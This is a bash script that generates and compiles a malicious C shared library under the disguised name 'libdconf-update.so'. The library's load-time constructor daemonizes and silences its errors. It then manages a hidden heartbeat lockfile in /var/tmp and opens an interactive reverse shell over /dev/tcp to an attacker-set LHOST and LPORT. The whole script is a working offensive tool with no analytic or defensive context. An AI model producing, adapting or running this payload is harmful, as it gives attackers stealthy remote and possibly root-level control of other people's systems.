#!/usr/bin/env bash
# --- CONFIGURATION ---
LHOST="${LHOST:-}"
LPORT="${LPORT:-4444}"
OUT_FILE="libdconf-update.so"
LOCKFILE="/var/tmp/.dconf-lock-root"
SESSION_TIMEOUT=60

if [[ -z "$LHOST" ]]; then
    echo "[-] LHOST is not set. Export it before running."
    exit 1
fi

# --- GENERATE C SOURCE ---
cat <<EOF > payload.c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/stat.h>
#include <time.h>
#include <string.h>
#include <fcntl.h>

static int _should_fire(void) {
    if (getenv("RE_SHELL")) return 0;

    struct stat st;
    if (stat("${LOCKFILE}", &st) == 0) {
        time_t now; time(&now);
        // Lockfile touched within SESSION_TIMEOUT seconds means
        // an active session heartbeat is running — do not fire
        if ((now - st.st_mtime) < ${SESSION_TIMEOUT}) return 0;
    }
    // No active session — claim the lockfile and fire
    FILE *f = fopen("${LOCKFILE}", "w");
    if (f) fclose(f);
    return 1;
}

__attribute__((constructor))
static void _init(void) {
    if (!_should_fire()) return;
    if (fork() != 0) return;
    setsid();
    if (fork() != 0) _exit(0);

    setenv("RE_SHELL", "1", 1);

    // Force silence by redirecting stderr (fd 2) to /dev/null at the OS level
    int fd = open("/dev/null", O_RDWR);
    if (fd != -1) {
        dup2(fd, 2);
        close(fd);
    }

    // Shell payload wrapped with heartbeat:
    //   - writes PID to lockfile so session-aware guard knows a shell is active
    //   - background loop touches lockfile every 30s while shell is alive
    //   - when shell dies, loop removes lockfile so next trigger fires freely
    char *args[] = {"/bin/bash", "-c",
        "echo $$ > /var/tmp/.dconf-lock-root; "
        "( while kill -0 $$ 2>/dev/null; do touch /var/tmp/.dconf-lock-root; sleep 30; done; rm -f /var/tmp/.dconf-lock-root ) & "
        "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1",
        NULL};
    execv("/bin/bash", args);
    _exit(0);
}
EOF

# --- COMPILE ---
gcc -shared -fPIC -nostartfiles -o "$OUT_FILE" payload.c -s
rm payload.c
echo "[+] Compiled $OUT_FILE with LHOST $LHOST"